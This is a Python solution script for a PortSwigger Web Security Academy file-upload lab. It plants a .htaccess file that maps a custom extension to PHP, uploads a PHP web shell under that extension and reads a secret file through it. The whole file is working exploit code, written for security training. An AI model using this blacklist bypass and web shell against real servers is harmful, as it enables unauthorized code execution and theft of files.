#!/usr/bin/env python3
"""
Web shell upload via extension blacklist bypass
PortSwigger Web Security Academy -- File Upload

Companion script for the writeup: 04-web-shell-upload-via-extension-blacklist-bypass.md

What this does:
    Logs in, uploads a .htaccess file (not blacklisted, since it isn't
    .php) containing "AddType application/x-httpd-php .l33t" to redefine
    which extension Apache treats as PHP in that directory, then uploads
    the actual web shell as exploit.l33t. The blacklist never sees .php on
    either request. Fetches the .l33t file to trigger execution under the
    newly-mapped extension and reads the secret.

Usage:
    python 04-web-shell-upload-via-extension-blacklist-bypass.py <lab-url>
    e.g. python 04-web-shell-upload-via-extension-blacklist-bypass.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

PHP_SHELL = "<?php echo file_get_contents('/home/carlos/secret'); ?>"
HTACCESS = "AddType application/x-httpd-php .l33t"


def _get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def _login(client: httpx.Client, base: str) -> bool:
    csrf = _get_csrf(client, f"{base}/login")
    r = client.post(f"{base}/login", data={
        "csrf": csrf, "username": "wiener", "password": "peter",
    }, follow_redirects=False)
    if r.status_code in (301, 302):
        loc = r.headers.get("location", "/")
        if loc.startswith("/"):
            loc = f"{base}{loc}"
        client.get(loc, follow_redirects=True)
    return "session" in str(client.cookies)


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, verify=False, timeout=15)

    if not _login(client, lab_url):
        print("[-] Login failed")
        return
    print("[+] Logged in as wiener")

    # Step 1 -- plant the .htaccess that maps .l33t to the PHP handler.
    csrf = _get_csrf(client, f"{lab_url}/my-account")
    r1 = client.post(f"{lab_url}/my-account/avatar",
                     files={"avatar": (".htaccess", HTACCESS.encode(), "text/plain")},
                     data={"csrf": csrf, "user": "wiener"})
    print(f"[*] .htaccess upload: {r1.status_code}")

    # Step 2 -- upload the shell under the now-whitelisted-by-Apache extension.
    csrf = _get_csrf(client, f"{lab_url}/my-account")
    r2 = client.post(f"{lab_url}/my-account/avatar",
                     files={"avatar": ("exploit.l33t", PHP_SHELL.encode(), "application/x-php")},
                     data={"csrf": csrf, "user": "wiener"})
    print(f"[*] exploit.l33t upload: {r2.status_code}")

    file_url = f"{lab_url}/files/avatars/exploit.l33t"
    fetched = client.get(file_url)
    secret = fetched.text.strip()
    print(f"[*] Fetched {file_url} -- body: {secret[:200]!r}")

    if not secret or "<?php" in secret:
        print("[-] File did not execute -- no secret recovered")
        return

    print(f"[+] Secret: {secret}")
    client.post(f"{lab_url}/submitSolution", data={"answer": secret})

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet -- double-check the extracted secret.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
